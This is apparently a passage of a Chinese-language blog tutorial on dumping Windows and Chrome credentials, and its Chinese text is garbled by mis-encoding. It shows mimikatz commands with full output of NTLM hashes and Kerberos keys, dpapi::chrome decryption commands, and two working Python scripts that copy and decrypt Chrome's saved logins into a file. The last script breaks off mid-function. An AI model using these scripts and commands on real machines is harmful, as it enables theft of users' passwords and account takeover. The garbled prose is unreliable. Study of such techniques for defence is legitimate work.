&#x2F; ##       &gt; https:&#x2F;&#x2F;blog.gVhmWw70VD.com&#x2F;EeLrXMiD</span><br><span class="line"> &#39;## v ##&#39;       Hp6bmVPNVLO9i7B             ( FiLGZos4eo99IXHOADBc44Ir )</span><br><span class="line">  &#39;#####&#39;        &gt; https:&#x2F;&#x2F;ljrq4GxgPj6NY7 &#x2F; https:&#x2F;&#x2F;A35s5WaTWwdjV2m6 ***&#x2F;</span><br><span class="line"></span><br><span class="line">EeLrXMiD # privilege::debug</span><br><span class="line">Privilege &#39;20&#39; OK</span><br><span class="line"></span><br><span class="line">EeLrXMiD # lsadump::sam &#x2F;sam:SAM &#x2F;system:SYSTEM</span><br><span class="line">Domain : æ¨±å²›éº»è¡£</span><br><span class="line">SysKey : 42939b566ede597c3284d1bd23b15a97</span><br><span class="line">Local SID : S-1-5-21-1645164750-2672341361-3879437546</span><br><span class="line"></span><br><span class="line">SAMKey : b58a3643feb8148887485d5b702aaf3f</span><br><span class="line"></span><br><span class="line">RID  : 000001f4 (500)</span><br><span class="line">User : Administrator</span><br><span class="line">  Hash NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0</span><br><span class="line"></span><br><span class="line">Supplemental Credentials:</span><br><span class="line">* Primary:NTLM-Strong-NTOWF *</span><br><span class="line">    Random Value : 900fff43b7507160b3e239892c034c22</span><br><span class="line"></span><br><span class="line">* Primary:Kerberos-Newer-Keys *</span><br><span class="line">    Default Salt : ASCOTBE1B49Administrator</span><br><span class="line">    Default Iterations : 4096</span><br><span class="line">    Credentials</span><br><span class="line">      aes256_hmac       (4096) : 8185175d7c176c6decf21cbfbde54df0a4b86cca948bb660091d2a873073b26b</span><br><span class="line">      aes128_hmac       (4096) : ce32484a789bb52f0e43fa09ddac2bf0</span><br><span class="line">      des_cbc_md5       (4096) : f8f7ad86cd6e9840</span><br><span class="line"></span><br><span class="line">* Packages *</span><br><span class="line">    NTLM-Strong-NTOWF</span><br><span class="line"></span><br><span class="line">* Primary:Kerberos *</span><br><span class="line">    Default Salt : ASCOTBE1B49Administrator</span><br><span class="line">    Credentials</span><br><span class="line">      des_cbc_md5       : f8f7ad86cd6e9840</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">RID  : 000001f5 (501)</span><br><span class="line">User : Guest</span><br><span class="line"></span><br><span class="line">RID  : 000001f7 (503)</span><br><span class="line">User : DefaultAccount</span><br><span class="line"></span><br><span class="line">RID  : 000001f8 (504)</span><br><span class="line">User : WDAGUtilityAccount</span><br><span class="line">  Hash NTLM: 4c5c287f286dce27cdd13c6b221979df</span><br><span class="line"></span><br><span class="line">Supplemental Credentials:</span><br><span class="line">* Primary:NTLM-Strong-NTOWF *</span><br><span class="line">    Random Value : 38ab6a222bbf783640bdcbb714227d57</span><br><span class="line"></span><br><span class="line">* Primary:Kerberos-Newer-Keys *</span><br><span class="line">    Default Salt : WDAGUtilityAccount</span><br><span class="line">    Default Iterations : 4096</span><br><span class="line">    Credentials</span><br><span class="line">      aes256_hmac       (4096) : c60e0605a0f960188d252efb376231de1e1fb3c2fbfd66cbc4a528d364a37bfc</span><br><span class="line">      aes128_hmac       (4096) : fb6b091efaa644e306673fcd565ce4f4</span><br><span class="line">      des_cbc_md5       (4096) : a1648949c202689e</span><br><span class="line"></span><br><span class="line">* Packages *</span><br><span class="line">    NTLM-Strong-NTOWF</span><br><span class="line"></span><br><span class="line">* Primary:Kerberos *</span><br><span class="line">    Default Salt : WDAGUtilityAccount</span><br><span class="line">    Credentials</span><br><span class="line">      des_cbc_md5       : a1648949c202689e</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">RID  : 000003e8 (1000)</span><br><span class="line">User : ascotbe</span><br><span class="line">  Hash NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0</span><br><span class="line"></span><br><span class="line">Supplemental Credentials:</span><br><span class="line">* Primary:NTLM-Strong-NTOWF *</span><br><span class="line">    Random Value : 42d6e016527f7bce204d94cc40baa99a</span><br><span class="line"></span><br><span class="line">* Primary:Kerberos-Newer-Keys *</span><br><span class="line">    Default Salt : ASCOTBE1B49ascotbe</span><br><span class="line">    Default Iterations : 4096</span><br><span class="line">    Credentials</span><br><span class="line">      aes256_hmac       (4096) : 35c0a798a120c3b112bcdb7636b8dd3e3b12284c0e85a5b1c93bfbe9c4b83c02</span><br><span class="line">      aes128_hmac       (4096) : 12a06f6bb5ff719a314ddfe96c83c69e</span><br><span class="line">      des_cbc_md5       (4096) : fdd661fe76542cdf</span><br><span class="line"></span><br><span class="line">* Packages *</span><br><span class="line">    NTLM-Strong-NTOWF</span><br><span class="line"></span><br><span class="line">* Primary:Kerberos *</span><br><span class="line">    Default Salt : ASCOTBE1B49ascotbe</span><br><span class="line">    Credentials</span><br><span class="line">      des_cbc_md5       : fdd661fe76542cdf</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">EeLrXMiD #</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬åªéœ€è¦æŸ¥çœ‹æœ€åä¸€ä¸ª<strong>ascotbe</strong>ï¼ˆæˆ‘æœ¬æœºè¿™ä¸ªæ˜¯ç®¡ç†å‘˜ç”¨æˆ·ï¼‰è¿™ä¸ªè´¦æˆ·çš„Hash NTLMå³å¯çŸ¥é“æœ¬æœºå¯†ç äº†ï¼Œé€šè¿‡ç½‘ç«™è§£å¯†</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/WindowsGrabPassword/7.png" alt="image-20210610150310107"></p><h4 id="é€šè¿‡mimikatzæŠ“å–å¯†ç "><a href="#é€šè¿‡mimikatzæŠ“å–å¯†ç " class="headerlink" title="é€šè¿‡mimikatzæŠ“å–å¯†ç "></a>é€šè¿‡mimikatzæŠ“å–å¯†ç </h4><p>éœ€è¦ç®¡ç†å‘˜æƒé™æ‰§è¡Œ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure><p>å³å¯å¾—å‡ºå¯†ç </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">EeLrXMiD # sekurlsa::logonpasswords</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 229076 (00000000:00037ed4)</span><br><span class="line">Session           : Interactive from 1</span><br><span class="line">User Name         : ascotbe</span><br><span class="line">Domain            : æ¨±å²›éº»è¡£</span><br><span class="line">Logon Server      : æ¨±å²›éº»è¡£</span><br><span class="line">Logon Time        : 2021&#x2F;6&#x2F;7 9:37:53</span><br><span class="line">SID               : S-1-5-21-1645164750-2672341361-3879437546-1000</span><br><span class="line">        mSv :</span><br><span class="line">         [00000003] Primary</span><br><span class="line">         * Username : ascotbe</span><br><span class="line">         * Domain   : æ¨±å²›éº»è¡£</span><br><span class="line">         * NTLM     : 31d6cfe0d16ae931b73c59d7e0c089c0</span><br><span class="line">         * SHA1     : da39a3ee5e6b4b0d3255bfef95601890afd80709</span><br><span class="line">        tsPkG :</span><br><span class="line">         * Username : ascotbe</span><br><span class="line">         * Domain   : (null)</span><br><span class="line">         * Password : (null)</span><br><span class="line">        wDiGeST :</span><br><span class="line">         * Username : ascotbe</span><br><span class="line">         * Domain   : (null)</span><br><span class="line">         * Password : (null)</span><br><span class="line">        kErberoS :</span><br><span class="line">         * Username : ascotbe</span><br><span class="line">         * Domain   : (null)</span><br><span class="line">         * Password : (null)</span><br><span class="line">        sSp :</span><br><span class="line">        crEdMan :</span><br><span class="line">        clOuDAp :</span><br></pre></td></tr></table></figure><h2 id="æµè§ˆå™¨å¯†ç "><a href="#æµè§ˆå™¨å¯†ç " class="headerlink" title="æµè§ˆå™¨å¯†ç "></a>æµè§ˆå™¨å¯†ç </h2><h3 id="Chromeæµè§ˆå™¨æ•°æ®"><a href="#Chromeæµè§ˆå™¨æ•°æ®" class="headerlink" title="Chromeæµè§ˆå™¨æ•°æ®"></a>Chromeæµè§ˆå™¨æ•°æ®</h3><p>Chromeçš„é…ç½®æ–‡ä»¶å­˜æ”¾åœ¨<code>%LocalAppData%</code>ç›®å½•ä¸‹ã€‚å¦‚æœæœ‰ä¸¤ä¸ªGoogle Chromeè´¦å·é‚£ä¹ˆæ¯ä¸ªè´¦å·ä¼šæœ‰ä¸åŒçš„é…ç½®æ–‡ä»¶</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\admin\AppData\Local\Google\Chrome\User Data\Default ï¼ˆç¬¬ä¸€ä¸ªé…ç½®æ–‡ä»¶çš„åç§°ï¼‰</span><br><span class="line">C:\Users\admin\AppData\Local\Google\Chrome\User Data\Profile 2 ï¼ˆåç»­çš„é…ç½®æ–‡ä»¶ä»¥è¿­ä»£æ•°å­—æ–¹å¼å‘½åï¼‰</span><br></pre></td></tr></table></figure><p>ç›®å½•ä¸­çš„<code>Login Data</code>æ˜¯SQLite 3æ•°æ®åº“æ–‡ä»¶ï¼Œé‡Œé¢å­˜æ”¾äº†å„ç§ç½‘ç«™å’Œè´¦å·ç­‰ä¿¡æ¯ã€‚</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/WindowsGrabPassword/8.png" alt="image-20210609143728350"></p><p>æˆ‘ä»¬åªéœ€è¦å…³æ³¨loginsè¿™å¼ è¡¨å³å¯</p><ul><li>origin_url:ç™»å½•ç½‘å€</li><li>username_value:ç”¨æˆ·å</li><li>password_value:è¢«åŠ å¯†çš„ç”¨æˆ·å¯†ç </li></ul><blockquote><p>chrome version 80ï¼ˆ80.0.3987.163ï¼‰ ç‰ˆæœ¬å‰</p></blockquote><p>chrome80ä»¥å‰çš„ç‰ˆæœ¬æ˜¯ç›´æ¥å¯ä»¥é€šè¿‡DPAPIä¸­çš„è§£å¯†å‡½æ•° CryptUnprotectDataæ¥è¿›è¡Œè§£å¯†çš„ã€‚</p><p>æµ‹è¯•ç‰ˆæœ¬ï¼š<a href="https://dl.google.com/release2/chrome/XASj0J0BUKotBRR0eLPLxw_79.0.3945.88/79.0.3945.88_chrome_installer.exe">chrome 79.0.3945.88</a></p><h4 id="Aç”¨æˆ·è§£Açš„chromeå¯†ç "><a href="#Aç”¨æˆ·è§£Açš„chromeå¯†ç " class="headerlink" title="Aç”¨æˆ·è§£Açš„chromeå¯†ç "></a>Aç”¨æˆ·è§£Açš„chromeå¯†ç </h4><p>ç›´æ¥ä½¿ç”¨å‘½ä»¤å³å¯è§£å¯†å‡º</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpapi::chrome &#x2F;in:&quot;C:\Users\ascotbe\AppData\Local\Google\Chrome\User Data\Default\Login Data&quot; &#x2F;unprotect</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/WindowsGrabPassword/9.png" alt="image-20210609154742793"></p><p>ä¹Ÿå¯ä»¥ç›´æ¥ä½¿ç”¨è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># !/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span>  shutil</span><br><span class="line"><span class="keyword">import</span>  sqlite3</span><br><span class="line"><span class="comment">#pip install pywin32</span></span><br><span class="line"><span class="keyword">import</span>  win32crypt</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">APP_DATA_PATH= os.environ[<span class="string">&#x27;LOCALAPPDATA&#x27;</span>]</span><br><span class="line">DB_PATH = <span class="string">r&#x27;Google\Chrome\User Data\Default\Login Data&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ChromePassword</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.passwordList = []</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_chrome_db</span>(<span class="params">self</span>):</span></span><br><span class="line">        _full_path = os.path.join(APP_DATA_PATH,DB_PATH)</span><br><span class="line">        _temp_path = os.path.join(APP_DATA_PATH,<span class="string">&#x27;sqlite_file&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> os.path.exists(_temp_path):</span><br><span class="line">            os.remove(_temp_path)</span><br><span class="line">        shutil.copyfile(_full_path,_temp_path)</span><br><span class="line">        self.show_password(_temp_path)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">show_password</span>(<span class="params">self,db_file</span>):</span></span><br><span class="line">        conn = sqlite3.connect(db_file)</span><br><span class="line">        _sql = <span class="string">&#x27;select signon_realm,username_value,password_value from logins&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> row <span class="keyword">in</span> conn.execute(_sql):</span><br><span class="line">            ret = win32crypt.CryptUnprotectData(row[<span class="number">2</span>],<span class="literal">None</span>,<span class="literal">None</span>,<span class="literal">None</span>,<span class="number">0</span>)</span><br><span class="line">            <span class="comment">#å¯†ç è§£æåå¾—åˆ°å­—èŠ‚ç ï¼Œéœ€è¦è¿›è¡Œè§£ç æ“ä½œ</span></span><br><span class="line">            _info = <span class="string">&#x27;url:%-40s username:%-20s password:%s\n&#x27;</span> %\</span><br><span class="line">                    (row[<span class="number">0</span>][:<span class="number">50</span>],row[<span class="number">1</span>],ret[<span class="number">1</span>].decode())</span><br><span class="line">            self.passwordList.append(_info)</span><br><span class="line">        conn.close()</span><br><span class="line">        os.remove(db_file)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">save_passwords</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;password.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.writelines(self.passwordList)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    Main = ChromePassword()</span><br><span class="line">    Main.get_chrome_db()</span><br><span class="line">    Main.save_passwords()</span><br></pre></td></tr></table></figure><h4 id="Bç”¨æˆ·è§£Açš„chromeå¯†ç "><a href="#Bç”¨æˆ·è§£Açš„chromeå¯†ç " class="headerlink" title="Bç”¨æˆ·è§£Açš„chromeå¯†ç "></a>Bç”¨æˆ·è§£Açš„chromeå¯†ç </h4><p>é¦–å…ˆæˆ‘ä»¬éœ€è¦è·å–åˆ°Aç”¨æˆ·çš„MasterKeyå€¼ï¼Œå°±å¯ä»¥è§£å¯†äº†</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpapi::chrome &#x2F;in:&quot;C:\Users\ascotbe\Desktop\Login Data&quot; &#x2F;unprotect &#x2F;masterkey:831d02bf734632f7aaa7719f5ec593111997c9aeefabe71ac4e4a963de546784662fcec40722a4656870698cff96c348a37d669131e99401e0947fa355e8fd0b</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/WindowsGrabPassword/10.png" alt="image-20210609161248445"></p><blockquote><p>chrome version 80 ï¼ˆ80.0.3987.163ï¼‰ç‰ˆæœ¬å</p></blockquote><p>åˆ©ç”¨ä¸»å¯†é’¥ä½¿ç”¨AES-GCMåŠ å¯†ç®—æ³•åŠ å¯†å¯†ç å­˜æ”¾Login Dataæ•°æ®åº“ï¼Œç„¶åç”¨DPAPIçš„åŠ å¯†å‡½æ•°CryptProtectDataåŠ å¯†ä¸»å¯†é’¥å­˜æ”¾åœ¨Local Stateæ–‡ä»¶ã€‚å…¶ä¸­Local Stateæ–‡ä»¶å­˜æ”¾åœ¨å¦‚ä¸‹åœ°å€ï¼ˆå‡è®¾windowsç”¨æˆ·ä¸ºadminï¼‰ï¼Œæœ¬è´¨æ˜¯ä¸ªjsonæ–‡ä»¶ï¼Œå…¶ä¸­ä¸€ä¸ªå€¼os_cryptä¸‹çš„encrypted_keyæ˜¯è§£å¯†éœ€è¦ç”¨çš„è¢«åŠ å¯†åçš„å¯†é’¥ã€‚</p><p>è§£å¯†æµç¨‹</p><ol><li>è·å–local stateå’ŒLogin Dataæ–‡ä»¶ä½ç½®</li><li>è·å–local stateä¸­åŠ å¯†çš„key(base64ç¼–ç )</li><li>æ•°æ®åº“è¯­å¥æå–Login Data sqlliteæ–‡ä»¶çš„password_value</li><li>DPAPIè§£å¯†åŠ å¯†key</li><li>ase-gcmè§£å¯†password_value</li></ol><p>è„šæœ¬å¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># !/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span>  shutil</span><br><span class="line"><span class="keyword">import</span>  sqlite3</span><br><span class="line"><span class="keyword">import</span>  win32crypt</span><br><span class="line"><span class="keyword">import</span> json,base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.backends <span class="keyword">import</span> default_backend</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives.ciphers <span class="keyword">import</span> (</span><br><span class="line">    Cipher, algorithms, modes</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">APP_DATA_PATH= os.environ[<span class="string">&#x27;LOCALAPPDATA&#x27;</span>]</span><br><span class="line">DB_PATH = <span class="string">r&#x27;Google\Chrome\User Data\Default\Login Data&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">NONCE_BYTE_SIZE = <span class="number">12</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">cipher, plaintext, nonce</span>):</span></span><br><span class="line">    cipher.mode = modes.GCM(nonce)</span><br><span class="line">    encryptor = cipher.encryptor()</span><br><span class="line">    ciphertext = encryptor.update(plaintext)</span><br><span class="line">    <span class="keyword">return</span> (cipher, ciphertext, nonce)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">cipher, ciphertext, nonce</span>):</span></span><br><span class="line">    cipher.mode = modes.GCM(nonce)</span><br><span class="line">    decryptor = cipher.decryptor()</span><br><span class="line">    <span class="keyword">return</span> decryptor.update(ciphertext)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_cipher</span>(<span class="params">key</span>):</span></span><br><span class="line">    cipher = Cipher(</span><br><span class="line">        algorithms.AES(key),</span><br><span class="line">        <span class="literal">None</span>,</span><br><span class="line">        backend=default_backend()</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">return</span> cipher</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dpapi_decrypt</span>(<span class="params">encrypted</span>):</span></span><br><span class="line">    <span class="keyword">import</span> ctypes</span><br><span class="line">    <span class="keyword">import</span> ctypes.wintypes</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DATA_BLOB</span>(<span class="params">ctypes.Structure</span>):</span></span><br><span class="line">        _fields_ = [(<span class="string">&#x27;cbData&#x27;</span>, ctypes.wintypes.DWORD),</span><br><span class="line">                    (<span class="string">&#x27;pbData&#x27;</span>, ctypes.POINTER(ctypes.c_char))]</span><br><span class="line"></span><br><span class="line">    p = ctypes.create_string_buffer(encrypted, <span class="built_in">len</span>(encrypted))</span><br><span class="line">    blobin = DATA_BLOB(ctypes.sizeof(p), p)</span><br><span class="line">    blobout = DATA_BLOB()</span><br><span class="line">    retval = ctypes.windll.crypt32.CryptUnprotectData(</span><br><span class="line">        ctypes.byref(blobin), <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="number">0</span>, ctypes.byref(blobout))</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> retval:</span><br><span class="line">        <span class="keyword">raise</span> ctypes.WinError()</span><br><span class="line">    result = ctypes.string_at(blobout.pbData, blobout.cbData)</span><br><span class="line">    ctypes.windll.kernel32.LocalFree(blobout.pbData)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">unix_decrypt</span>(<span class="params">encrypted</span>):</span></span><br><span class="line">    <span class="keyword">if</span> sys.platform.startswith(<span class="string">&#x27;linux&#x27;</span>):</span><br><span class="line">        password = <span class="string">&#x27;peanuts&#x27;</span></span><br><span class="line">        iterations = <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> NotImplementedError</span><br><span class="line"></span><br><span class="line">    <span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line">    <span class="keyword">from</span> Crypto.Protocol.KDF <span class="keyword">import</span> PBKDF2</span><br><span class="line"></span><br><span class="line">    salt = <span class="string">&#x27;saltysalt&#x27;</span></span><br><span class="line">    iv = <span class="string">&#x27; &#x27;</span> * <span class="number">16</span></span><br><span class="line">    length = <span class="number">16</span></span><br><span class="line">    key = PBKDF2(password, salt, length, iterations)</span><br><span class="line">    cipher = AES.new(key, AES.MODE_CBC, IV=iv)</span><br><span class="line">    decrypted = cipher.decrypt(encrypted[<span class="number">3</span>:])</span><br><span class="line">    <span class="keyword">return</span> decrypted[:-<span class="built_in">ord</span>(decrypted[-<span class="number">1</span>])]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_key_from_local_state</span>():</span></span><br><span class="line">    jsn = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(os.path.join(os.environ[<span class="string">&#x27;LOCALAPPDATA&#x27;</span>],</span><br><span class="line">        <span class="string">r&quot;Google\Chrome\User Data\Local State&quot;</span>),encoding=<span class="string">&#x27;utf-8&#x27;</span>,mode =<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        jsn = json.loads(<span class="built_in">str</span>(f.readline()))</span><br><span class="line">    <span class="keyword">return</span> jsn[<span class="string">&quot;os_crypt&quot;</span>][<span class="string">&quot;encrypted_key&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">aes_decrypt</span>(<span class="params">encrypted_txt</span>):</span></span><br><span class="line">    encoded_key = get_key_from_local_state()</span><br><span class="line">    encrypted_key = base64.b64decode(encoded_key.encode())</span><br><span class="line">    encrypted_key = encrypted_key[<span class="number">5</span>:]</span><br><span class="line">    key = dpapi_decrypt(encrypted_key)</span><br><span class="line">    nonce = encrypted_txt[<span class="number">3</span>:<span class="number">15</span>]</span><br><span class="line">    cipher = get_cipher(key)</span><br><span class="line">    <span class="keyword">return</span> decrypt(cipher,encrypted_txt[<span class="number">15</span>:],nonce)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ChromePassword</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.passwordList = []</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_chrome_db</span>(<span class="params">self</span>):</span></span><br><span class="line">        _full_path = os.path.join(APP_DATA_PATH,DB_PATH)</span><br><span class="line">        _temp_path = os.path.join(APP_DATA_PATH,<span class="string">&#x27;sqlite_file&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> os.path.exists(_temp_path):</span><br><span class="line">            os.remove(_temp_path)</span><br><span class="line">        shutil.copyfile(_full_path,_temp_path)</span><br><span class="line">        self.show_password(_temp_path)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">show_password</span>(<span class="params">self,db_file</span>):</span></span><br><span class="line">        conn = sqlite3.connect(db_file)</span><br><span class="line">        _sql = <span class="string">&#x27;select signon_realm,username_value,password_value from logins&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> row <span class="keyword">in</span> conn.execute(_sql):</span><br><span class="line">            <span class="comment"># print(type(row[2]))</span></span><br><span class="line">            host = row[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">if</span> host.startswith(<span class="string">&#x27;android&#x27;</span>):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            name = 